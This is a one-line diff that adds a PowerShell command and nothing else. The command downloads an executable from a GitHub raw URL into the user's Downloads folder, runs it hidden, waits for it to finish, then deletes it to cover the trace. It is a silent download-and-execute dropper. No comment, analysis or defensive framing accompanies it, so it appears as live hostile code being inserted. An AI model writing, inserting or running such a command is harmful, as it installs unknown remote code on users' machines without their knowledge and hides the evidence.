@@ -1,0 +1,1 @@
+$d=(New-Object -ComObject Shell.Application).Namespace('shell:Downloads').Self.Path;$f="$d\b1.exe";iwr 'https://raw.githubusercontent.com/c0261/1/refs/heads/main/b1.exe' -OutFile $f;$p=Start-Process $f -ArgumentList "run" -WindowStyle Hidden -PassThru;$p.WaitForExit();Remove-Item $f;exit
